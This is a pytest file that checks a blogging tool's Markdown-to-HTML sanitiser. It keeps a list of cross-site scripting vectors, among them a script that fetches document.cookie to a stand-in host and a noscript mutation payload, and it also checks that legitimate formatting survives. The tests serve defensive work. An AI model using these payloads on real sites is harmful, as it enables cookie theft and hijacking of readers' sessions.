"""What Herald publishes must not be able to run in a reader's browser.

Every post is authored once in Markdown and rendered to HTML for the platforms
that want HTML — Medium and WordPress, via ``formatting.to_html``. The renderer
underneath is Python-Markdown, and Python-Markdown passes raw HTML in its input
straight through to its output. That is documented, deliberate, and completely
reasonable for its usual job; it also means that for as long as nothing
sanitised the result, a ``<script>`` tag in a body was a ``<script>`` tag in a
published post.

The reason that is worth a test rather than a shrug is where the Markdown comes
from. Herald's bodies are not typed by a careful human into a box they own:

* the generator writes them with an LLM, and a model that has just read an
  attacker's README is a model that can be talked into emitting a tag;
* an RSS or GitHub trigger assembles them from somebody else's text;
* and the editor accepts a paste from anywhere.

And the blast radius is not Herald's own UI — it is the author's audience, on
the author's domain, with the author's name on it. Medium and WordPress both
sanitise their own input, which is the argument for doing it here *as well as*
rather than *instead of*: whichever of the two is relaxed first is the one
nobody is watching, and Herald would learn about it from its readers.

So: the vectors below must not survive rendering, and — the half that makes the
fix a fix rather than a blunt instrument — everything a real post is made of
must survive it intact.
"""
from __future__ import annotations

import pytest

from app.services.publishers import formatting

# --------------------------------------------------------------------------- #
# The vectors                                                                  #
# --------------------------------------------------------------------------- #

#: Each case is (name, markdown, the substring that must not appear in output).
#: Written as raw HTML inside Markdown because that is exactly the shape the
#: renderer used to wave through — these are not hypothetical encodings, they
#: are what a body containing them produced before ``sanitize_html`` existed.
_VECTORS = [
    ("script tag", "<script>alert(1)</script>", "<script"),
    ("script with payload", "<script>fetch('//e.test/'+document.cookie)</script>", "document."),
    ("img onerror", "<img src=x onerror=alert(1)>", "onerror"),
    ("svg onload", "<svg onload=alert(1)></svg>", "onload"),
    ("body onload", "<body onload=alert(1)>", "onload"),
    ("iframe", "<iframe src='//e.test'></iframe>", "<iframe"),
    ("object", "<object data='//e.test'></object>", "<object"),
    ("embed", "<embed src='//e.test'>", "<embed"),
    ("form", "<form action='//e.test'><input name=p></form>", "<form"),
    ("style block", "<style>body{display:none}</style>", "<style"),
    ("link stylesheet", "<link rel=stylesheet href='//e.test/x.css'>", "<link"),
    ("meta refresh", "<meta http-equiv=refresh content='0;url=//e.test'>", "<meta"),
    ("base tag", "<base href='//e.test/'>", "<base"),
    ("inline handler on a div", "<div onclick=alert(1)>x</div>", "onclick"),
    ("javascript: href", "[click](javascript:alert(1))", "javascript:"),
    ("data: href", "[click](data:text/html;base64,PHNjcmlwdD4=)", "data:text/html"),
    ("javascript: image", "![i](javascript:alert(1))", "javascript:"),
    ("html comment", "<!-- hidden -->", "<!--"),
]


@pytest.mark.parametrize(
    ("markdown", "forbidden"),
    [pytest.param(md, bad, id=name) for name, md, bad in _VECTORS],
)
def test_the_vector_does_not_survive_rendering(markdown: str, forbidden: str):
    assert forbidden.lower() not in formatting.to_html(markdown).lower()


def test_a_script_body_is_removed_not_merely_unwrapped():
    """Dropping ``<script>`` while keeping its text would publish the payload.

    A sanitiser that strips disallowed *tags* but keeps their *content* turns
    ``<script>alert(1)</script>`` into the visible paragraph ``alert(1)``. That
    is no longer executable, so it passes a naive "no <script> in the output"
    check, and it is still the attacker's text on the author's blog.
    """
    html = formatting.to_html("<script>alert('xss')</script>\n\nReal text.")
    assert "alert" not in html
    assert "Real text." in html


def test_the_payload_does_not_reach_the_plain_text_platforms_either():
    """Twitter and LinkedIn get plain text, which is drawn from the same HTML.

    ``to_plain_text`` renders to HTML and then strips tags, so before the
    sanitiser it read a script's *body* as ordinary text — the tag vanished and
    ``alert('xss')`` was posted verbatim as part of the tweet.
    """
    plain = formatting.to_plain_text("<script>alert('xss')</script>\n\nReal text.")
    assert "alert" not in plain
    assert "Real text." in plain


def test_a_mutation_vector_does_not_reassemble_into_a_tag():
    """Malformed markup must not be recovered *into* something executable.

    This is the failure an allow-list of tag names does not catch on its own:
    the sanitiser and the browser disagree about how to repair broken markup,
    and the browser's repair produces a tag the sanitiser never saw. Delegating
    to a real HTML parser rather than a regex pass is what makes this hold.
    """
    html = formatting.to_html("<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">")
    assert "onerror" not in html.lower()
    assert "<script" not in html.lower()


# --------------------------------------------------------------------------- #
# ...and the other half: real posts must come through unharmed                 #
# --------------------------------------------------------------------------- #


def test_a_fenced_code_block_keeps_its_language_hint():
    """``class="language-x"`` is what every platform's highlighter reads.

    An attribute allow-list that forgot ``class`` on ``code`` would silently
    turn every code block on every published post grey, which for a developer
    marketing tool is most of the body.
    """
    html = formatting.to_html("```python\nprint(1)\n```")
    assert 'class="language-python"' in html
    assert "print(1)" in html


def test_a_table_survives_intact():
    html = formatting.to_html("| a | b |\n|---|---|\n| 1 | 2 |")
    for tag in ("<table>", "<thead>", "<tbody>", "<tr>", "<th>", "<td>"):
        assert tag in html


@pytest.mark.parametrize(
    ("markdown", "expected"),
    [
        ("**bold**", "<strong>bold</strong>"),
        ("*em*", "<em>em</em>"),
        ("# Heading", "<h1>Heading</h1>"),
        ("> quote", "<blockquote>"),
        ("- one\n- two", "<li>one</li>"),
        ("`inline`", "<code>inline</code>"),
        ("---", "<hr"),
    ],
)
def test_ordinary_markdown_still_renders(markdown: str, expected: str):
    assert expected in formatting.to_html(markdown)


def test_an_http_link_keeps_its_href():
    html = formatting.to_html("[Herald](https://herald.doaide.com/post)")
    assert 'href="https://herald.doaide.com/post"' in html


def test_an_outbound_link_is_given_a_safe_rel():
    """A published post links wherever its body said, to a reader we do not know."""
    html = formatting.to_html("[x](https://example.test)")
    assert "noopener" in html and "noreferrer" in html


def test_a_remote_image_keeps_its_source():
    """Lead images and screenshots are the point of a post; they must survive."""
    html = formatting.to_html("![shot](https://cdn.example.test/a.png)")
    assert 'src="https://cdn.example.test/a.png"' in html
    assert 'alt="shot"' in html


def test_a_mailto_link_is_allowed():
    assert 'href="mailto:hi@example.test"' in formatting.to_html("[m](mailto:hi@example.test)")


def test_sanitize_html_is_idempotent():
    """Rendering an already-clean post again must not degrade it.

    Worth pinning because the publishers concatenate — a lead image in front of
    a rendered body — and any later change that sanitises the whole assembled
    document would otherwise quietly strip attributes on its second pass.
    """
    once = formatting.to_html("# T\n\n[l](https://e.test) `c`\n\n```py\nx=1\n```")
    assert formatting.sanitize_html(once) == once


def test_the_lead_image_survives_being_sanitised():
    """``lead_image_html`` output is prepended to a post by Medium and WordPress."""
    figure = formatting.lead_image_html("https://cdn.example.test/c.png", alt="Cover")
    cleaned = formatting.sanitize_html(figure)
    assert "<figure>" in cleaned
    assert 'src="https://cdn.example.test/c.png"' in cleaned
    assert 'alt="Cover"' in cleaned


def test_an_empty_body_is_not_an_error():
    assert formatting.to_html("") == ""
